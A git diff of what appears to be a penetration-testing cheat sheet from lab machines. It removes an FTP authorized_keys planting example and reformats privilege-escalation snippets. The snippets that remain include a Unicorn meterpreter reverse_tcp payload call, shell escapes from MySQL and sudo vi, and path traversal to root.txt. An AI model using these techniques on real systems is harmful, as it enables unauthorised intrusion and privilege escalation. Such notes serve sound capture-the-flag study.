@@ -131,32 +131,6 @@ tags:
   id
   uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
   ```
-  * If `sudo -l` gives something like this.
-  ```notch@Blocky:~$ sudo -l
-  [sudo] password for notch: 
-  Matching Defaults entries for notch on Blocky:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-    
-  User notch may run the following commands on Blocky:
-    (ALL : ALL) ALL
-  notch@Blocky:~$ cat /root/root.txt
-  cat: /root/root.txt: Permission denied   -- Does not work
-  notch@Blocky:~$ sudo cat /root/root.txt  -- Works.
-  ```
-  * If we were able to access FTP and still no root access, we can do like this ...
-  ```ftp 10.10.10.37
-  Connected to 10.10.10.37.
-  220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
-  Name (10.10.10.37:root): enemy
-  331 Password required for enemy
-  Password:
-  230 User notch logged in
-  Remote system type is UNIX.
-  Using binary mode to transfer files.
-  ftp> put id_rsa.pub
-  ftp> rename id_rsa.pub authorized_keys
-  ```
   * To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
   ```
   root# /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
@@ -166,13 +140,19 @@ tags:
   msf5 exploit(multi/handler) >         
   ```
   * Get Shell from MYSQL
-  `mysql> \! /bin/sh`
+  ```
+  mysql> \! /bin/sh
+  ```
   
   * To get Root from VI
-  `www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt`
+  ```
+  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+  ```
   or
-  `www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/anyrandomFile`
-  Type Escape and enter `:!/bin/bash`
+  ```
+  www-data@enemy:/home/haris$ sudo /usr/bin/vi /var/www/html/anyrandomFile
+  Type Escape and enter :!/bin/bash
+  ```
   * Use [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses etc
 
 # Tools
